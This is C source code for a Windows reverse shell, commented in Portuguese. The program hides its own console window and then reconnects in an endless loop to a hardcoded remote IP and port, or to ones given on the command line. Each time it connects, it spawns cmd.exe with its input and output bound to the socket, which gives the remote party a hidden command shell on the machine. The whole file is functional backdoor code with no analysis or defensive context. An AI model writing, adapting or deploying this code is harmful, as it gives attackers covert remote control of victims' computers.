#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT 752
#define DEFAULT_IP "192.168.15.6"

WSADATA wsaData;
SOCKET Winsocket;
STARTUPINFO theProcess;
PROCESS_INFORMATION info_proc;
struct sockaddr_in Winsocket_Structure;


void CriaSocket(char *IP, short port);
void Erro(void);
void Conexao(void);
void AbreShell(void);

int main(int argc, char *argv[])
{
 char *IP =  DEFAULT_IP;
 short port = DEFAULT_PORT;



  if (argc == 3)
  {
    strncpy(IP,argv[1],16);
    port = atoi(argv[2]);
  }

 ShowWindow(GetForegroundWindow(),SW_HIDE);

 while(1){
 CriaSocket(IP, port);
 Erro();
 Conexao();
 AbreShell();
}

}

void CriaSocket(char *IP, short port)
{

  WSAStartup(MAKEWORD(2,2), &wsaData);
  Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
  Winsocket_Structure.sin_port=htons(port);
  Winsocket_Structure.sin_family=AF_INET;
  Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);
}

void Erro(void)
{
if(Winsocket==INVALID_SOCKET)
  {
    WSACleanup();
  }
}

void Conexao(void)
{
// Faz a conexão com o server

  if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
  {
    WSACleanup();
  }
}

void AbreShell(void)
{
  memset(&theProcess, 0, sizeof(theProcess));
  theProcess.cb=sizeof(theProcess);
  theProcess.dwFlags=STARTF_USESTDHANDLES;
  theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;

 if(CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
    {
     WSACleanup();
    }

}
